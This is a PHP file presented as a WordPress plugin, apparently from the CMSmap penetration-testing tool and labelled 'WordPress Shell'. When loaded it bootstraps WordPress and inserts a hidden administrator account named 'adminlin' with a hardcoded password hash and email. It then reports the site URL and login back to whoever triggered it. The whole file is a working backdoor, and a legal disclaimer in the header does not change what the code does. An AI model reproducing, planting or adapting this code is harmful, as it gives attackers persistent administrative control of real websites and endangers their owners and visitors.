<?php 
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
$patha = dirname(__FILE__) . '/';
$path = false;
if(strpos($patha,'wp-content') !== false){ 
 $path = explode('wp-content',$patha);
 $path = trim($path[0]);
}
if(strpos($patha,'wp-includes') !== false){ 
 $path = explode('wp-includes',$patha);
 $path = trim($path[0]);
}
if(strpos($patha,'wp-admin') !== false){ 
 $path = explode('wp-admin',$patha);
 $path = trim($path[0]);
}
if($path == false){
	$path = $patha;
}
include($path.'wp-blog-header.php');
$userr = $table_prefix.'users';
$user_loginv = 'adminlin';
$aaa = $wpdb->get_row("SELECT * FROM `".$userr."` WHERE user_login = '".$user_loginv."'");
if(empty($aaa)){
$wpdb->insert($table_prefix.'users', array(
'ID' => null,
'user_login' => $user_loginv,
'user_pass' =>'57a48cf5883989417e6c0583c87ceb40',
'user_nicename' =>$user_loginv,
'user_email' =>'admin@admin.com',
'user_url' =>$user_loginv,
'user_registered' =>'2012-08-03 01:24:01',
'user_activation_key' =>'',
'user_status' =>'0',
'display_name' =>$user_loginv
        )
    );
$userx = $wpdb->get_row("SELECT * FROM `".$userr."` WHERE user_login = '".$user_loginv."'");
$wp_user_object = new WP_User($userx->ID);
$wp_user_object->set_role( 'administrator' );
$siteurl = $wpdb->get_row("SELECT * FROM `".$table_prefix.'options'."` WHERE option_name = 'siteurl'");
echo $siteurl->option_value.'|'.$user_loginv.'|';
}else{
echo 'false';
}
?>